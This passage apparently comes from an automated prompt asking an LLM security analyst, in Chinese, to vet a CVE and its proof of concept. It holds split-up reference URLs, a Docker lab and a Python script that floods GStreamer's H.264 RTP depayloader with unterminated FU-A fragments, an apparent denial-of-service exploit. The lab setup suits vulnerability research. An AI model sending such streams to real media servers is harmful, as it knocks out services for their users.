", \"r\", \"e\", \"d\", \"h\", \"a\", \"t\", \".\", \"c\", \"o\", \"m\", \"/\", \"e\", \"r\", \"r\", \"a\", \"t\", \"a\", \"/\", \"R\", \"H\", \"S\", \"A\", \"-\", \"2\", \"0\", \"2\", \"6\", \":\", \"6\", \"9\", \"2\", \"3\", \"2\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"a\", \"c\", \"c\", \"e\", \"s\", \"s\", \".\", \"r\", \"e\", \"d\", \"h\", \"a\", \"t\", \".\", \"c\", \"o\", \"m\", \"/\", \"e\", \"r\", \"r\", \"a\", \"t\", \"a\", \"/\", \"R\", \"H\", \"S\", \"A\", \"-\", \"2\", \"0\", \"2\", \"6\", \":\", \"7\", \"0\", \"2\", \"6\", \"4\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"a\", \"c\", \"c\", \"e\", \"s\", \"s\", \".\", \"r\", \"e\", \"d\", \"h\", \"a\", \"t\", \".\", \"c\", \"o\", \"m\", \"/\", \"e\", \"r\", \"r\", \"a\", \"t\", \"a\", \"/\", \"R\", \"H\", \"S\", \"A\", \"-\", \"2\", \"0\", \"2\", \"6\", \":\", \"7\", \"0\", \"5\", \"8\", \"4\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"a\", \"c\", \"c\", \"e\", \"s\", \"s\", \".\", \"r\", \"e\", \"d\", \"h\", \"a\", \"t\", \".\", \"c\", \"o\", \"m\", \"/\", \"e\", \"r\", \"r\", \"a\", \"t\", \"a\", \"/\", \"R\", \"H\", \"S\", \"A\", \"-\", \"2\", \"0\", \"2\", \"6\", \":\", \"7\", \"0\", \"8\", \"0\", \"3\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"a\", \"c\", \"c\", \"e\", \"s\", \"s\", \".\", \"r\", \"e\", \"d\", \"h\", \"a\", \"t\", \".\", \"c\", \"o\", \"m\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"c\", \"v\", \"e\", \"/\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"1\", \"8\", \"6\", \"4\", \"9\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"b\", \"u\", \"g\", \"z\", \"i\", \"l\", \"l\", \"a\", \".\", \"r\", \"e\", \"d\", \"h\", \"a\", \"t\", \".\", \"c\", \"o\", \"m\", \"/\", \"s\", \"h\", \"o\", \"w\", \"_\", \"b\", \"u\", \"g\", \".\", \"c\", \"g\", \"i\", \"?\", \"i\", \"d\", \"=\", \"2\", \"5\", \"1\", \"0\", \"6\", \"1\", \"4\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"0\", \"x\", \"S\", \"e\", \"m\", \"i\", \"z\", \"z\", \"z\", \"/\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"1\", \"8\", \"6\", \"4\", \"9\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"l\", \"a\", \"b\", \".\", \"f\", \"r\", \"e\", \"e\", \"d\", \"e\", \"s\", \"k\", \"t\", \"o\", \"p\", \".\", \"o\", \"r\", \"g\", \"/\", \"g\", \"s\", \"t\", \"r\", \"e\", \"a\", \"m\", \"e\", \"r\", \"/\", \"g\", \"s\", \"t\", \"r\", \"e\", \"a\", \"m\", \"e\", \"r\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"-\", \"/\", \"m\", \"e\", \"r\", \"g\", \"e\", \"_\", \"r\", \"e\", \"q\", \"u\", \"e\", \"s\", \"t\", \"s\", \"/\", \"1\", \"1\", \"3\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/51b4aa8b28e79e3347bd622be67fc557/compose.yaml\n---\nservices:\n  receiver:\n    build:\n      context: ./receiver\n      args:\n        # TODO: replace with the verified commit immediately before the fix.\n        GSTREAMER_REF: \"${GSTREAMER_REF:?set GSTREAMER_REF to a pinned commit}\"\n    mem_limit: 512m\n    expose: [\"5000/udp\"]\n    networks: [poc]\n\n  sender:\n    build:\n      context: ./sender\n    depends_on: [receiver] # only executes after reciever container is up\n    networks: [poc]\n\nnetworks:\n  poc:\n    internal: true\n\n\n---\n/tmp/51b4aa8b28e79e3347bd622be67fc557/sender/Dockerfile\n---\nFROM python:3.12-slim\n\nWORKDIR /sender\n\nCOPY send_rtp.py .\n\nCMD [\"python3\", \"send_rtp.py\", \"--target\", \"receiver\", \"--port\", \"5000\", \"--packets\", \"10000\"]\n\n\n---\n/tmp/51b4aa8b28e79e3347bd622be67fc557/sender/send_rtp.py\n---\n\"\"\"Send a bounded malformed H.264/RTP stream to the local lab receiver.\"\"\"\n\nimport argparse\nimport socket\nimport struct\nimport time\n\n\n# To avoid linting errors for argparse types\nclass Args(argparse.Namespace):\n    target: str = \"\"\n    port: int = 5000\n    rate: int = 500\n    packets: int = 10_000\n\ndef main():\n    parser = argparse.ArgumentParser()\n    _ = parser.add_argument(\"--target\", type=str, default=\"receiver\")\n    _ = parser.add_argument(\"--port\", type=int, default=5000)\n    _ = parser.add_argument(\"--packets\", type=int, default=10_000)\n    args = parser.parse_args(namespace=Args())\n\n    if not 1 <= args.port <= 65535:\n        parser.error(\"port must be between 1 and 65535\")\n\n    # Setup socket between sender and receiver\n    destination = (args.target, args.port)\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n    # setup packet sending information\n    sequence = 0\n    timestamp = 90_000\n    ssrc = 0x13572468\n    interval = 1.0 / 500\n\n    # H.264 FU-A: NAL type 28. Start the fragmented NAL once,\n    # then send continuation fragments without setting the end bit.\n    nal_type = 5  # IDR slice\n    fu_indicator = 0x7C  # F=0, NRI=3, Type=28\n\n    try:\n        # Send the packets one by one without end bits\n        for i in range(args.packets):\n            start_bit = 0x80 if i == 0 else 0x00\n            fu_header = start_bit | nal_type\n            payload = bytes([fu_indicator, fu_header]) + (b\"\\x55\" * 1000)\n\n            # RTP v2, no CSRC/extensions, payload type 96, marker bit clear.\n            rtp_header = struct.pack(\n                \"!BBHII\",\n                0x80,\n                96,\n                sequence,\n                timestamp,\n                ssrc,\n            )\n\n            _ = sock.sendto(rtp_header + payload, destination)\n            sequence = (sequence + 1) & 0xFFFF\n\n            if interval:\n                time.sleep(interval)\n\n        print(f\"Sent {args.packets} RTP packets to {args.target}:{args.port}\")\n    finally:\n        sock.close()\n\nif __name__ == \"__main__\":\n    main()\n\n\n---\n/tmp/51b4aa8b28e79e3347bd622be67fc557/receiver/Dockerfile\n---\n# Builder Stage\nFROM ubuntu:24.04 as build\n\nARG GSTREAMER_REF\nRUN test -n \"$GSTREAMER_REF\"\n\nRUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y \\\n    bison build-essential flex git ninja-build pkg-config python3 python3-venv \\\n    libglib2.0-dev liborc-0.4-dev \\\n    && rm -rf /var/lib/apt/lists/*\n\n# Ubuntu 24.04 ships Meson 1.3.x, but this GStreamer revision requires >= 1.4.\nRUN python3 -m venv /opt/meson \\\n    && /opt/meson/bin/pip install --no-cache-dir meson==1.4.2\nENV PATH=\"/opt/meson/bin:${PATH}\"\n\n## clone and checkout the bad/good build\nWORKDIR /src\nRUN git clone https://gitlab.freedesktop.org/gstreamer/gstreamer.git\nWORKDIR /src/gstreamer\nRUN git checkout \"$GSTREAMER_REF\"\n\n## Compile gstreamer\nRUN meson setup build \\\n      --prefix=/opt/gst \\\n      --libdir=lib \\\n      --buildtype=debug \\\n      -Dauto_features=disabled \\\n      -Dtools=enabled \\\n      -Dgst-plugins-good:rtp=enabled \\\n      -Dgst-plugins-good:udp=enabled \\\n && meson compile -C build \\\n && meson install -C build\n\n# Runtime Stage\nFROM ubuntu:24.04 AS receiver\n\nRUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y \\\n    libglib2.0-0 liborc-0.4-0 \\\n    && rm -rf /var/lib/apt/lists/*\n\nCOPY --from=build /opt/gst /opt/gst\n\nENV PATH=\"/opt/gst/bin:${PATH}\" \\\n    LD_LIBRARY_PATH=\"/opt/gst/lib:${LD_LIBRARY_PATH}\" \\\n    GST_PLUGIN_PATH=\"/opt/gst/lib/gstreamer-1.0\"\n\nEXPOSE 5000/udp\n\n## Final command tot start gstreamer depayloader for receiver\nCMD [\"gst-launch-1.0\", \"-v\", \\\n     \"udpsrc\", \"address=0.0.0.0\", \"port=5000\", \\\n     \"caps=application/x-rtp,media=video,encoding-name=H264,payload=96,clock-rate=90000\", \\\n     \"!\", \"rtph264depay\", \"!\", \"fakesink\"]\n\n\n\n\n\n---\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
